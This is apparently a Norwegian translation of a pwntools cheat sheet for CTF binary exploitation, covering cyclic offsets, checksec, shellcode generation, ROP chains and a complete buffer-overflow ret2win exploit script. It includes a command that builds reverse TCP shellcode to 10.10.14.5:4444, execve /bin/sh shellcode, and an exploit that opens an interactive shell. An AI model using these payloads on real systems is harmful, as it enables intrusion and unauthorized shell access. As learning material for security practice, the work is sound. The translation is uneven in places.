<!-- language-home-navigation -->
[🏠 Norsk Hovedside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇬🇧 English](../README.md)

---


# pwntools Jukseark

[pwntools](https://github.com/Gallopsled/pwntools) er et best-in-class CTF-rammeverk og utnyttelsesutviklingsbibliotek skrevet i Python. Designet for rask prototyping, binær utnyttelse (pwn) og omvendt utvikling, gir den en omfattende pakke med kommandolinjeverktøy (`pwn cyclic`, `pwn checksec`, `pwn asm`, `pwn shellcraft`) sammen med et høyt nivå Python API for samhandling med lokale prosesser og eksterne sockets.

---

## Innholdsfortegnelse

- [Kjerneegenskaper](#kjernefunksjoner)
- [Installasjon](#installation)
- [Command-Line Utilities (`pwn <cmd>`)](#command-line-utilities-pwn-cmd)
  - [`pwn cyclic` (Buffer Offset Calculation)](#pwn-cyclic-buffer-offset-calculation)
  - [`pwn checksec` (mitigation-inspection)](#pwn-checksec-mitigation-inspection)
  - [`pwn asm` & `pwn disasm` (montør / demonter)](#pwn-asm--pwn-disasm-montør--demonter)
  - [`pwn shellcraft` (Shellcode Generator)](#pwn-shellcraft-shellcode-generator)
  - [`pwn template` (Exploit Skeleton Generator)](#pwn-template-exploit-skeleton-generator)
- [Python Exploit Development Workflow](#python-exploit-development-workflow)
  - [Process & Remote Socket Connections](#process--remote-socket-connections)
  - [ELF-parsing og symboler](#elf-parsing--symbols)
  - [ROP Chain Construction](#rop-chain-construction)
  - [Packing & Endianness (`p32` / `p64`)](#packing--endianness-p32--p64)
- [Complete Exploit Eksempel (Buffer Overflow + ret2win)](#complete-exploit-example-buffer-overflow--ret2win)

---

## Kjernefunksjoner

- **Rørarkitektur:** Samlet grensesnitt for samhandling med lokale prosesser (`process`), eksterne TCP-sockets (`remote`) og SSH-økter (`ssh`).
- **Binær- og gadgetinspeksjon:** Automatisert ELF-symboloppløsning, GOT/PLT-oppslag og automatisert ROP-kjedesyntese.
- **On-the-Fly Assembly:** Øyeblikkelig oversettelse mellom assembly mnemonics og opcodes på tvers av x86, x86_64, ARM, MIPS og AArch64.
- **Shellcode-syntese:** Forhåndsbygde, tilpassbare skallkodemaler for omvendte skjell, execve, fillesing og unnvikelse.

---

## Installasjon
```bash
# Ubuntu / Debian / Kali Linux
sudo apt-get update && sudo apt-get install -y python3-pwntools

# Via pip in an isolated Python environment
pip3 install pwntools

# Verify command-line utilities
pwn version
```
---

## Kommandolinjeverktøy (`pwn <cmd>`)

### `pwn cyclic` (Buffer Offset Calculation)
Generer unike De Bruijn-sykliske mønstre for å bestemme den nøyaktige krasjforskyvningen (EIP / RIP-overskriving):
```bash
# Generate a 200-byte unique pattern
pwn cyclic 200

# Find offset of crashing pattern (e.g. from crash address or register value 0x6161616c)
pwn cyclic -l 0x6161616c
# Output: 44 (offset is exactly 44 bytes to saved instruction pointer)

# 64-bit architecture cyclic pattern lookup
pwn cyclic -l "faaa" -n 8
```
### `pwn checksec` (avbøtende inspeksjon)
Sjekk sikkerhetsbegrensninger (Canary, NX, PIE, RELRO, ASLR) for alle kjørbare ELF-filer:
```bash
pwn checksec /path/to/binary
```
### `pwn asm` & `pwn disasm` (montør / demonter)
Sett sammen instruksjoner til shellcode-bytes direkte fra terminalen:
```bash
# Assemble x86 instructions to hex bytes
pwn asm "xor eax, eax; push eax"

# Assemble 64-bit shellcode with null-byte output format
pwn asm -c amd64 "mov rax, 59; syscall" --format hex

# Disassemble raw hex bytes back to assembly
pwn disasm "31c050682f2f7368682f62696e89e3505389e1b00bcd80" -c i386
```
### `pwn shellcraft` (Shellcode Generator)
Generer produksjonsklare shellcode-nyttelast direkte til terminal stdout eller binære filer:
```bash
# Generate Linux x64 execve /bin/sh shellcode in hex
pwn shellcraft amd64.linux.sh --format hex

# Generate reverse TCP shellcode (IP: 10.10.14.5, Port: 4444)
pwn shellcraft amd64.linux.connect 10.10.14.5 4444

# Output pure raw bytes directly into a file
pwn shellcraft amd64.linux.sh --format raw > shellcode.bin
```
### `pwn template` (Exploit Skeleton Generator)
Generer en kamptestet Python-utnyttelsesmal for en binær og ekstern målserver:
```bash
pwn template ./vuln_binary --host 10.10.10.100 --port 1337 > exploit.py
```
---

## Python Exploit Development Workflow

### Prosess- og eksterne stikkontakter
```python
from pwn import *

# Set target architecture and log level
context.arch = 'amd64'
context.log_level = 'debug'

# Local process execution
io = process('./vuln_binary')

# Or connect to remote CTF instance
# io = remote('10.10.10.100', 1337)

# Send and receive data
io.recvuntil(b'Enter your name: ')
io.sendline(b'Alice')

# Switch to interactive shell once exploit succeeds
io.interactive()
```
### ELF-parsing og symboler
Les funksjonsadresser, GOT- og PLT-tabeller automatisk uten manuelle GDB-oppslag:
```python
elf = ELF('./vuln_binary')
print(f"Target function address: {hex(elf.symbols['win'])}")
print(f"puts() PLT address: {hex(elf.plt['puts'])}")
print(f"puts() GOT address: {hex(elf.got['puts'])}")
```
### ROP-kjedekonstruksjon
Bygg returorientert programmering (ROP)-kjeder automatisk:
```python
elf = ELF('./vuln_binary')
rop = ROP(elf)

# Call win_function(0x1337, 0xdeadbeef)
rop.win(0x1337, 0xdeadbeef)
print(rop.dump())

payload = b"A" * 40 + rop.chain()
```
### Pakking og utholdenhet (`p32` / `p64`)
Konverter heltallsminneadresser til little-endian byte:
```python
# 32-bit little-endian packing
address_32 = p32(0x080484b6)  # Returns b'\xb6\x84\x04\x08'

# 64-bit little-endian packing
address_64 = p64(0x0000000000401156)

# Unpacking bytes to integer
val = u64(b"\x56\x11\x40\x00\x00\x00\x00\x00")
```
---

## Komplett utnyttelseseksempel (bufferoverflyt + ret2win)
```python
#!/usr/bin/env python3
from pwn import *

# Binary configuration
binary_path = './challenge'
context.binary = binary_path
context.log_level = 'info'

elf = ELF(binary_path)

# 1. Start target process or remote connection
if args.REMOTE:
    io = remote('target.ctf.local', 9999)
else:
    io = process(binary_path)

# 2. Craft payload
offset = 40
win_address = elf.symbols['win']

# Include ret gadget for 16-byte stack alignment in Ubuntu 64-bit
rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0]

payload = flat(
    asm('nop') * offset,
    ret_gadget,
    win_address
)

# 3. Deliver payload
io.recvuntil(b'Say something: ')
io.sendline(payload)

# 4. Drop to interactive shell
log.success("Exploit sent! Enjoy your shell:")
io.interactive()
```